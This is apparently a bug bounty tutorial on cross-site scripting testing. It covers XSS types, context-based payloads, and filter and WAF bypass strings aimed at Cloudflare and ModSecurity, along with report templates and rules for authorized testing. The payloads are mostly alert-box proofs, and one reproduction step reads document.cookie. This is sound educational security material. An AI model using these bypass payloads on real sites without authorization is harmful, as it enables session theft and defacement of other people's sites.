# 🎯 Complete Bug Bounty XSS Testing Guide

## Table of Contents
1. [Getting Started](#getting-started)
2. [XSS Types](#xss-types)
3. [Testing Methodology](#testing-methodology)
4. [Payload Selection](#payload-selection)
5. [Common Bypass Techniques](#common-bypass-techniques)
6. [Reporting Guidelines](#reporting-guidelines)
7. [Legal & Ethical Considerations](#legal--ethical-considerations)

---

## Getting Started

### What is XSS?
Cross-Site Scripting (XSS) is a security vulnerability that allows attackers to inject malicious scripts into web pages viewed by other users.

### Prerequisites for Bug Bounty Hunting
- ✅ Understanding of HTML, JavaScript, and HTTP
- ✅ Knowledge of web application architecture
- ✅ Familiarity with browser developer tools
- ✅ Patience and persistence
- ✅ **Written authorization** to test

---

## XSS Types

### 1. Reflected XSS
**Description:** Payload is reflected immediately in the response.

**Example:**
```
https://example.com/search?q=<script>alert('XSS')</script>
```

**Testing Steps:**
1. Find input points (search boxes, URL parameters)
2. Inject basic payload
3. Check if reflected in response
4. Verify execution in browser

### 2. Stored XSS (Persistent)
**Description:** Payload is stored on server and executed when page is loaded.

**Example:**
```
Comment field: <script>alert('XSS')</script>
```

**Testing Steps:**
1. Find data storage points (comments, profiles, posts)
2. Submit payload
3. Navigate to page where data is displayed
4. Verify execution

### 3. DOM-Based XSS
**Description:** Vulnerability exists in client-side JavaScript code.

**Example:**
```
https://example.com/#<img src=x onerror=alert(1)>
```

**Testing Steps:**
1. Analyze JavaScript code
2. Find DOM manipulation (innerHTML, document.write)
3. Test with hash fragments or URL parameters
4. Verify execution

---

## Testing Methodology

### Step 1: Reconnaissance
```
1. Identify all input points
   - URL parameters
   - Form fields
   - Headers (User-Agent, Referer)
   - Cookies
   - File uploads

2. Understand application behavior
   - How is input processed?
   - Where is it reflected?
   - What encoding is applied?
```

### Step 2: Initial Testing
```
1. Start with simple payloads:
   <script>alert(1)</script>
   <img src=x onerror=alert(1)>
   <svg onload=alert(1)>

2. Check response:
   - Is payload reflected?
   - Is it executed?
   - Is it sanitized/encoded?
```

### Step 3: Context Analysis
```
Determine where your input appears:

1. HTML Context:
   <div>YOUR_INPUT</div>
   → Use: <script>alert(1)</script>

2. Attribute Context:
   <input value="YOUR_INPUT">
   → Use: " onload=alert(1) x="

3. JavaScript Context:
   <script>var x = 'YOUR_INPUT';</script>
   → Use: '; alert(1); //

4. URL Context:
   <a href="YOUR_INPUT">
   → Use: javascript:alert(1)
```

### Step 4: Filter Bypass
```
If basic payloads are blocked:

1. Case variation:
   <ScRiPt>alert(1)</sCrIpT>

2. Encoding:
   %3Cscript%3Ealert(1)%3C/script%3E

3. Alternative tags:
   <svg onload=alert(1)>
   <img src=x onerror=alert(1)>

4. Event handlers:
   <body onload=alert(1)>
   <input onfocus=alert(1) autofocus>
```

---

## Payload Selection

### Basic Payloads (Start Here)
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
```

### When Basic Payloads Fail

#### 1. Script Tag Blocked
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<input onfocus=alert(1) autofocus>
```

#### 2. Quotes Filtered
```html
<img src=x onerror=alert(1)>
<svg onload=alert`1`>
<img src=x onerror=alert(String.fromCharCode(88,83,83))>
```

#### 3. Parentheses Blocked
```html
<svg onload=alert`1`>
<img src=x onerror=alert\`1\`>
```

#### 4. Angle Brackets Encoded
```javascript
';alert(1);//
'-alert(1)-'
";alert(1);//
```

---

## Common Bypass Techniques

### 1. WAF Bypass
```html
<!-- Cloudflare -->
<svg/onload=alert`1`>
<img src=x onerror=\u0061lert(1)>

<!-- ModSecurity -->
<iframe src=\\\"javascript:alert`1`\\\">
<svg><animate onbegin=alert(1)>

<!-- Generic WAF -->
<input onfocus=eval(atob('YWxlcnQoMSk=')) autofocus>
```

### 2. Filter Evasion
```html
<!-- Case Variation -->
<ScRiPt>alert(1)</sCrIpT>

<!-- Null Bytes -->
<script>alert(1)%00</script>

<!-- HTML Entities -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- Unicode -->
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### 3. Context-Specific Bypasses
```html
<!-- Inside Attribute -->
" autofocus onfocus=alert(1) x="

<!-- Inside JavaScript -->
'; alert(1); //

<!-- Inside Event Handler -->
alert(1)

<!-- Inside URL -->
javascript:alert(1)
```

---

## Reporting Guidelines

### Report Structure

#### 1. Title
```
[XSS] Reflected Cross-Site Scripting in Search Parameter
```

#### 2. Severity
```
High / Medium / Low (based on impact)
```

#### 3. Description
```
A reflected XSS vulnerability exists in the search functionality 
that allows an attacker to execute arbitrary JavaScript code in 
the context of the victim's browser.
```

#### 4. Steps to Reproduce
```
1. Navigate to https://example.com/search
2. Enter the following payload in search box:
   <script>alert(document.cookie)</script>
3. Submit the form
4. Observe JavaScript execution
```

#### 5. Proof of Concept
```
URL: https://example.com/search?q=<script>alert(1)</script>

Screenshot: [Attach screenshot showing alert box]

Video: [Optional: Screen recording of exploitation]
```

#### 6. Impact
```
An attacker can:
- Steal session cookies
- Perform actions on behalf of victim
- Deface the website
- Redirect to malicious sites
- Steal sensitive information
```

#### 7. Remediation
```
1. Implement proper input validation
2. Use output encoding (HTML entity encoding)
3. Implement Content Security Policy (CSP)
4. Use HTTPOnly and Secure flags for cookies
```

### CVSS Score Calculation
```
Use CVSS calculator: https://www.first.org/cvss/calculator/3.1

Typical XSS scores:
- Reflected XSS: 6.1 (Medium)
- Stored XSS: 7.1 (High)
- DOM XSS: 6.1 (Medium)
```

---

## Legal & Ethical Considerations

### ✅ DO
- Get written permission before testing
- Follow program scope and rules
- Report vulnerabilities responsibly
- Respect rate limits
- Keep findings confidential
- Test only authorized targets
- Document everything

### ❌ DON'T
- Test without authorization
- Access other users' data
- Perform DoS attacks
- Test out-of-scope assets
- Publicly disclose before fix
- Use findings maliciously
- Ignore program guidelines

### Bug Bounty Platforms
1. **HackerOne** - https://hackerone.com
2. **Bugcrowd** - https://bugcrowd.com
3. **Synack** - https://synack.com
4. **Intigriti** - https://intigriti.com
5. **YesWeHack** - https://yeswehack.com

### Responsible Disclosure Timeline
```
Day 0:  Report vulnerability
Day 1-7: Triage by security team
Day 7-90: Fix development and testing
Day 90+: Public disclosure (if agreed)
```

---

## Advanced Tips

### 1. Automation
```bash
# Use tools for initial discovery
- Burp Suite
- OWASP ZAP
- XSStrike
- Dalfox

# But always verify manually!
```

### 2. Chaining Vulnerabilities
```
XSS + CSRF = Account takeover
XSS + Open Redirect = Phishing
XSS + File Upload = Stored XSS
```

### 3. Persistence
```
- Try different input points
- Test all parameters
- Check headers and cookies
- Look for DOM sinks
- Analyze JavaScript files
```

### 4. Learning Resources
- **OWASP XSS Guide**: https://owasp.org/www-community/attacks/xss/
- **PortSwigger Academy**: https://portswigger.net/web-security/cross-site-scripting
- **HackerOne Hacktivity**: https://hackerone.com/hacktivity
- **PentesterLab**: https://pentesterlab.com

---

## Quick Reference

### Most Effective Payloads
```html
1. <script>alert(document.domain)</script>
2. <img src=x onerror=alert(1)>
3. <svg onload=alert(1)>
4. <iframe src=javascript:alert(1)>
5. <input onfocus=alert(1) autofocus>
```

### Testing Checklist
- [ ] URL parameters
- [ ] Form inputs
- [ ] Headers (User-Agent, Referer)
- [ ] Cookies
- [ ] File uploads
- [ ] JSON/XML inputs
- [ ] WebSocket messages
- [ ] PostMessage handlers

---

## Remember

> "With great power comes great responsibility"

Always test ethically and legally. Your goal is to make the internet safer, not to cause harm.

Happy (ethical) hacking! 🛡️

---

**Created by:** Aditya Sharma  
**GitHub:** [@Hackhubadi](https://github.com/Hackhubadi)  
**App Repository:** [XSS-BugBounty-Android-App](https://github.com/Hackhubadi/XSS-BugBounty-Android-App)
